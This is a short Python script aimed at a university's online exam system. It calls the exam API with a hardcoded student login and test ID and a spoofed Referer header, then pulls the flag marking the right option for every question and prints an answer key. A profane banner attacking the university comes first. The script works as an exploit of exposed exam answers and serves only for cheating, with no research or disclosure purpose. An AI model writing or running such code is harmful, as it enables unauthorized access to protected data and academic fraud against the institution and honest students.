import requests as re
from sty import bg, fg, ef, rs

TEST_NOT_FOUND = True

banner = '''
                    Fuck LPU!!
....................../´¯/) 
....................,/¯../ 
.................../..../ 
............./´¯/'...'/´¯¯`·¸ 
........../'/.../..../......./¨¯\ 
........('(...´...´.... ¯~/'...') 
.........\.................'...../ 
..........''...\.......... _.·´ 
............\..............( 
..............\.............\...

'''
# PAYLOADS
payload = {
    'LoginId': 11902263,
    'RoleId': 3,
    'IsDemo': 0
}

q_payload = {
    'TestId': 48780,
    'Set': 1,
    'LoginId': 11902263
}

o_payload = {
    'QuestionId': None
}

# HEADERS
headers = {
    'Referer': 'oas.lpu.in'
}

# result = re.get('https://oas.lpu.in/api/OnlineExam/GetQuestionOptionEditDetail', headers={'Referer':'oas.lpu.in'}, params=payload)
# result2 = re.get('https://oas.lpu.in/api/OnlineExam/GetQuestionNumbersDetail?TestId=48780&Set=1&LoginId=11902370', headers={'Referer':'oas.lpu.in'})
# result2 = re.get('https://oas.lpu.in/api/OnlineExam/GetTestToAttemptDetail?LoginId=11902370&RoleId=3&IsDemo=0', headers={'Referer':'oas.lpu.in'})

print(banner)

query = re.get('https://oas.lpu.in/api/OnlineExam/GetTestToAttemptDetail', params=payload, headers={'Referer':'oas.lpu.in'})

result = query.json()

print(f'{fg.yellow}searching for the test{fg.rs}...')
for item in result:
    if item['TestId'] == 48780:
        print(f'{fg.green}caught the test!{fg.rs}')
        TEST_NOT_FOUND = False
        break

if TEST_NOT_FOUND:
    print(f'{fg.red}TEST NOT FOUND... Make sure that test is available{fg.rs}')
    quit()

print(f'{fg.yellow}extracting question details...{fg.rs}')
query = re.get('https://oas.lpu.in/api/OnlineExam/GetQuestionNumbersDetail', params=q_payload, headers={'Referer':'oas.lpu.in'})
result = query.json()

print(f'{fg.green}done!{fg.rs}')
print(f'{fg.blue}fetching answers...{fg.rs}')
for item in result:
    correct_option = None
    correct_option_answer = None
    o_payload['QuestionId'] = item['QuestionId']
    query = re.get('https://oas.lpu.in/api/OnlineExam/GetQuestionOptionEditDetail', headers={'Referer':'oas.lpu.in'}, params=o_payload)
    result = query.json()
    for option_no, option in enumerate(result, start=1):
        if option['IsRightAnswer'] == 'True':
            correct_option = option_no
            correct_option_answer = option['OptionDescription']
            break

    print(f"[\'Q{item['QuestionNo']})\', \'Option {correct_option}', \'{correct_option_answer}' ]")

